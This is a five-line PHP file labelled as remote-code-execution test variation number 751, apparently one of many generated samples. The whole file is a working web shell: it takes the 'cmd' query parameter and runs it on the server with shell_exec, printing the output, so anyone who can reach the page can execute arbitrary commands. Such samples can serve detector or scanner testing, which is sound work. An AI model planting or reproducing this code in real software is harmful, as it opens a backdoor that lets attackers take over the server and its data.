<?php
// RCE test variation #751
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>